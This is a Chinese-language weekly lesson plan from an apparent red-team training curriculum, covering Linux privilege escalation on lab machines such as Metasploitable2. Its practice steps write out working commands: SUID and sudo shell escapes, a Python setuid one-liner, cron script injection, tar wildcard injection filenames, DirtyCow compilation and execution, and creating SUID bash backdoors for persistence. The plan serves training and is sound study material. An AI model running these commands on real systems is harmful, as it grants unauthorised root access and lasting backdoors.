@@ -1,0 +1,342 @@
+================================================================================
+第21周：Linux权限提升 (提权期)
+================================================================================
+
+【本周围绕的核心渗透案例阶段】
+引用红队队员完整学习手册中的案例：
+Web应用漏洞利用 → 获得www-data初始Shell → Linux权限提升至root
+这是一个典型的内网渗透起点场景：攻击者通过Web漏洞获得低权限Shell后，
+需要在目标Linux服务器上完成本地提权，为后续内网横向移动建立立足点。
+
+【本周学习目标】
+1. 掌握Linux系统信息收集的完整方法论（手动+自动化工具）
+2. 熟练掌握SUID/Sudo配置错误导致的提权路径
+3. 理解并利用Cron任务和Linux Capabilities进行提权
+4. 掌握经典Linux内核漏洞（DirtyCow、DirtyPipe）的利用方法
+5. 能够在Metasploitable2等靶机上完成完整的Linux提权链
+6. 建立标准化Linux提权checklist和工作流程
+
+【本周知识清单】
+- /etc/passwd, /etc/shadow, /etc/group 文件结构与权限
+- SUID/SGID/Sticky Bit 特殊权限位原理
+- /etc/sudoers 配置规则与常见配置错误
+- Crontab 定时任务格式、权限与劫持原理
+- Linux Capabilities(7) 机制与不安全配置
+- 常见Linux内核漏洞：DirtyCow(CVE-2016-5195)、DirtyPipe(CVE-2022-0847)、OverlayFS(CVE-2021-3493)、PwnKit(CVE-2021-4034)
+- GTFOBins 使用方法论
+- LinPEAS/WinPEAS自动化信息收集原理
+- $PATH环境变量劫持提权
+- 通配符注入攻击
+- LD_PRELOAD提权技术
+- Python库劫持提权
+- Systemd Service提权
+- Docker组提权
+
+【本周工具清单】
+- linpeas.sh (LinPEAS) — 自动Linux权限提升枚举脚本
+- linux-exploit-suggester — 内核漏洞建议工具
+- GTFOBins (gtfobins.github.io) — 在线SUID/Sudo绕过查找
+- pspy — 无root权限下的进程监控工具
+- find / grep / ls — 命令行基础信息收集
+- Metasploitable2 — 靶机环境
+- HackTheBox / VulnHub — 在线练习平台
+- nmap — 版本扫描辅助
+- netstat / ss — 网络连接信息收集
+- searchsploit — 漏洞库搜索
+
+================================================================================
+周一：Linux信息收集与枚举
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Linux系统信息收集方法论
+    - 系统基本信息：whoami, id, uname -a, cat /etc/os-release
+    - 用户与组信息：cat /etc/passwd, cat /etc/group, getent group
+    - 网络信息：ifconfig/ip a, netstat -tulpn, ss -tulpn, arp -a
+    - 进程与服务：ps aux, systemctl list-units, service --status-all
+    - 文件系统：find / -type f -perm -4000 2>/dev/null, ls -la /home
+    - 定时任务：cat /etc/crontab, crontab -l, ls -la /etc/cron*
+    - LinPEAS自动化信息收集原理与输出解读
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：手动信息收集+LinPEAS自动化枚举
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+  实验环境：Metasploitable2 / HTB靶机
+
+  操作步骤：
+    Step 1: 获得初始shell后执行基础命令收集
+      whoami; id; uname -a; cat /etc/os-release; hostname
+    Step 2: 上传linpeas.sh到目标
+      攻击机: python3 -m http.server 80
+      目标机: wget http://192.168.1.100/linpeas.sh -O /tmp/linpeas.sh
+    Step 3: 执行LinPEAS并分析输出
+      chmod +x /tmp/linpeas.sh
+      /tmp/linpeas.sh | tee /tmp/peas_output.txt
+      重点查看: [*] 开头的高风险项、红色输出的95%+概率提权项
+    Step 4: 使用linux-exploit-suggester检查内核漏洞
+      上传linux-exploit-suggester.sh并执行
+      对比LinPEAS输出交叉验证
+    Step 5: 手工验证自动化工具发现的结果
+      针对每个高危项进行手工确认
+    Step 6: 整理信息收集笔记，建立提权路径优先级列表
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握Linux信息收集的系统化流程，理解LinPEAS输出结构
+  - 遇到问题：____________________（记录实际操作中遇到的问题）
+  - 明日计划：深入学习SUID和Sudo机制，准备GTFOBins查阅方法论
+
+================================================================================
+周二：SUID/Sudo提权
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：SUID与Sudo提权原理
+    - SUID(Set User ID)权限位原理：文件以所有者权限执行
+    - SGID(Set Group ID)权限位原理
+    - find / -perm -4000 -type f 2>/dev/null 命令解析
+    - sudo -l 输出解读：NOPASSWD、通配符权限、环境变量继承
+    - /etc/sudoers配置语法与常见错误配置
+    - GTFOBins使用方法论：通过程序名查找利用方式
+    - PATH劫持：可执行文件调用相对路径时的利用
+    - LD_PRELOAD提权：通过环境变量注入恶意共享库
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：SUID程序利用和Sudo配置绕过
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+  操作步骤：
+    Step 1: 查找所有SUID程序
+      find / -perm -4000 -type f 2>/dev/null
+      记录输出结果，列出所有SUID文件路径
+    Step 2: 执行sudo -l查看可执行命令
+      sudo -l
+      注意: (root) NOPASSWD: /usr/bin/xxx 和 (ALL) ALL 的区别
+    Step 3: 利用GTFOBins查找SUID利用方法
+      浏览器打开 gtfobins.github.io
+      逐个搜索SUID程序名（如find, vim, bash, python, perl, less, awk）
+      记录每个程序的提权命令
+    Step 4: 实际利用SUID find提权
+      find . -exec /bin/sh -p \; -quit
+      验证: id (应显示euid=0/root)
+    Step 5: 练习Sudo绕过
+      场景: sudo -l 显示可执行 /usr/bin/less
+      利用: sudo less /etc/passwd → !/bin/bash → root shell
+    Step 6: PATH劫持练习
+      创建恶意二进制文件替换被调用的命令
+      echo '/bin/bash' > /tmp/malicious_command
+      chmod +x /tmp/malicious_command
+      export PATH=/tmp:$PATH
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：掌握SUID查找方法论和GTFOBins使用技巧
+  - 遇到问题：____________________
+  - 明日计划：深入研究Cron任务和Capabilities提权技术
+
+================================================================================
+周三：Cron任务与Capabilities提权
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：计划任务与Linux能力机制
+    - Cron体系结构：/etc/crontab, /var/spool/cron/crontabs, /etc/cron.d/, /etc/cron.*/, crontab -l
+    - Cron任务劫持条件：可写脚本文件、通配符注入、PATH劫持
+    - Systemd Timers 作为Cron替代
+    - Linux Capabilities(7) 机制概述：CAP_CHOWN, CAP_DAC_OVERRIDE, CAP_SETUID, CAP_SYS_ADMIN, CAP_SYS_PTRACE等
+    - getcap -r / 2>/dev/null 扫描文件权能
+    - 危险Capabilities: cap_setuid+ep, cap_sys_admin+ep, cap_dac_read_search+ep, cap_sys_ptrace+ep
+    - Python/Perl/Ruby等解释器的Capabilities利用
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Cron劫持和Capabilities提权实战
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+  操作步骤：
+    Step 1: 枚举所有Cron任务
+      cat /etc/crontab
+      ls -la /etc/cron.d/ /etc/cron.daily/ /etc/cron.hourly/ /etc/cron.weekly/ /etc/cron.monthly/
+      crontab -l 2>/dev/null
+    Step 2: 使用pspy监控无root权限下的Cron执行
+      上传pspy64到目标
+      chmod +x pspy64
+      ./pspy64
+      观察周期性执行的进程及其用户权限
+    Step 3: 检查Cron脚本权限
+      ls -la /etc/cron.daily/
+      查找可写的.sh/.py脚本文件
+      尝试注入: echo 'chmod +s /bin/bash' >> vulnerable_script.sh
+    Step 4: 扫描所有文件Capabilities
+      getcap -r / 2>/dev/null
+      重点关注: cap_setuid+ep, cap_sys_admin+ep
+    Step 5: 利用Python Capabilities提权
+      若Python有cap_setuid+ep:
+      python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
+      验证: id (应显示uid=0)
+    Step 6: 利用tar通配符注入（若Cron使用tar备份）
+      若发现Cron执行tar命令使用通配符
+      创建利用文件: touch "/tmp/--checkpoint=1" "/tmp/--checkpoint-action=exec=sh shell.sh"
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解Cron在提权中的关键角色，掌握pspy监控技术
+  - 遇到问题：____________________
+  - 明日计划：学习经典内核漏洞利用（DirtyCow、DirtyPipe）
+
+================================================================================
+周四：内核漏洞提权 (DirtyCow, DirtyPipe)
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Linux内核漏洞提权原理与实践
+    - 内核漏洞提权概述：用户态→内核态的利用原理
+    - CVE-2016-5195 (DirtyCow) 竞争条件漏洞原理
+      - Copy-on-Write(COW)机制与竞态条件
+      - /proc/self/mem写入只读文件的原理
+    - CVE-2022-0847 (DirtyPipe) 管道缓冲区覆写漏洞
+      - splice系统调用与管道缓冲机制
+      - 任意文件覆写提权
+    - CVE-2021-3493 (OverlayFS) 内核挂载权限绕过
+    - CVE-2021-4034 (PwnKit) pkexec本地提权
+    - 内核版本→漏洞对应关系查询方法
+    - 编译利用代码的环境准备（同内核版本的编译机）
+    - 利用失败的风险评估：系统崩溃、服务中断
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：内核漏洞编译与利用
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+  操作步骤：
+    Step 1: 确认目标内核版本
+      uname -a; cat /proc/version; cat /etc/issue
+      记录：内核版本、发行版、架构（x86_64/arm）
+    Step 2: 使用searchsploit搜索可利用漏洞
+      searchsploit linux kernel <版本号>
+      或使用linux-exploit-suggester.sh自动推荐
+    Step 3: 下载DirtyCow利用代码
+      从exploit-db或GitHub获取dirtycow.c
+      检查代码质量和可靠性（注释、测试环境、成功确认）
+    Step 4: 本地编译利用代码
+      gcc -pthread dirtycow.c -o dirtycow -lcrypt
+      注意：需要在与目标相同内核版本的机器上编译
+      或直接在目标上编译：gcc -pthread dirtycow.c -o dirtycow -lcrypt 2>/dev/null
+    Step 5: 上传并执行利用程序
+      wget http://192.168.1.100/dirtycow -O /tmp/dirtycow
+      chmod +x /tmp/dirtycow
+      ./dirtycow
+      等待竞态条件触发（可能需要多次尝试）
+    Step 6: 验证提权结果
+      id (确认uid=0)
+      若成功：将/bin/bash拷贝为root_backdoor，设置SUID
+      若失败：分析错误信息，调整利用参数
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：理解内核漏洞利用的基本流程和风险控制
+  - 遇到问题：____________________
+  - 明日计划：Metasploitable2完整Linux提权实战
+
+================================================================================
+周五：Linux提权综合实战 (Metasploitable2 提权)
+================================================================================
+
+📚 第1小时 | 理论学习 (09:00 - 10:00)
+  学习内容：Linux提权综合实战方法论
+    - 标准化提权流程：基础信息收集→自动化工具→SUID/Sudo→服务/Cron→内核漏洞
+    - 提权优先级：服务漏洞 > 配置错误 > 内核漏洞（安全风险递减）
+    - 多种提权路径的优先级排列原则
+    - 提权后的后渗透操作清单
+    - 实战中常见陷阱：
+      - 受限shell（rbash）绕过
+      - 只读文件系统上的操作限制
+      - SELinux/AppArmor的绕过考虑
+    - Metasploitable2靶机特点：大量已知漏洞、SUID程序众多
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+💻 第2小时 | 动手实践 (10:00 - 11:00)
+  练习内容：Metasploitable2完整提权流程实战
+  参考文件：/home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+  实验环境：Metasploitable2虚拟机
+
+  操作步骤：
+    Step 1: 获得www-data初始shell
+      利用Metasploitable2的DVWA/TWiki等Web漏洞获取shell
+      或使用SSH: ssh msfadmin@<IP> (密码: msfadmin)
+      验证当前权限: whoami; id
+    Step 2: 执行完整信息收集
+      上传并运行linpeas.sh: ./linpeas.sh | tee /tmp/linpeas_output.txt
+      重点查看SUID程序列表和sudo配置
+    Step 3: 发现/usr/bin/nmap有SUID位
+      ls -la /usr/bin/nmap
+      确认: -rwsr-xr-x 说明有SUID位
+    Step 4: 利用nmap SUID提权
+      方法一 (旧版nmap --interactive):
+        nmap --interactive
+        !sh
+        id (显示uid=root)
+      方法二 (新版nmap):
+        echo 'os.execute("/bin/sh")' > /tmp/root.nse
+        sudo nmap --script=/tmp/root.nse
+    Step 5: 发现更多SUID程序并练习利用
+      查找vim: find / -perm -4000 | grep vim
+      利用方式: vim -c ':!/bin/sh'
+      查找find: 使用 find . -exec /bin/sh -p \; -quit
+    Step 6: 建立持久化后门
+      cp /bin/bash /tmp/rootshell
+      chmod +s /tmp/rootshell
+      ls -la /tmp/rootshell (-rwsr-sr-x 确认SUID设置成功)
+      /tmp/rootshell -p (直接获得root shell)
+    Step 7: 整理完整的提权笔记，记录所有发现的提权路径
+
+📝 第3小时 | 复盘总结 (11:00 - 12:00)
+  - 今日收获：完成完整Linux提权链，建立标准化提权流程
+  - 遇到问题：____________________
+  - 明日计划：复习本周所有内容，在VulnHub上练习额外目标
+
+================================================================================
+周六：复习日 (2h 复习 + 1h HTB/THM)
+================================================================================
+
+📚 复习内容（2小时）
+  1. 回顾本周学习的5种Linux提权路径，制作提权决策树思维导图
+  2. 重新梳理LinPEAS输出解读方法，标记每种颜色的含义
+  3. 整理SUID/Sudo常见程序的GTFOBins查询结果速查表
+  4. 回顾CVE-2016-5195、CVE-2022-0847、CVE-2021-4034的利用条件
+
+💻 HTB/THM练习（1小时）
+  - 登录HackTheBox平台
+  - 选择一台Easy难度Linux机器
+  - 专注练习权限提升环节
+  - 目标：在30分钟内完成从Shell到Root的提权
+
+📝 复习笔记
+  - 本周最有效的技术：____________________
+  - 需要加强的部分：____________________
+  - 下周预习计划：Windows权限提升的基本概念
+
+================================================================================
+周日：休息日
+================================================================================
+
+【本周资源清单】
+理论知识文件：
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+  /home/a/成长为一个红队/网安基础知识/XX-权限提升原理.txt
+
+实践教程文件：
+  /home/a/成长为一个红队/archstrike-privilege-escalation教学/01-Linux权限提升完整指南.txt
+
+在线练习：
+  HackTheBox: Bashed, Lame, Beep, Nibbles (Linux Easy)
+  VulnHub: Kioptrix系列, DC系列
+  TryHackMe: Linux Privesc, Linux Privesc Arena
+
+工具下载：
+  linpeas.sh: https://github.com/carlospolop/PEASS-ng
+  pspy: https://github.com/DominicBreuker/pspy
+  linux-exploit-suggester: https://github.com/mzet-/linux-exploit-suggester
+  GTFOBins: https://gtfobins.github.io
+
+【本周完成检查】
+[ ] 周一 [ ] 周二 [ ] 周三 [ ] 周四 [ ] 周五
+[ ] 周六复习 [ ] 笔记 [ ] 体能
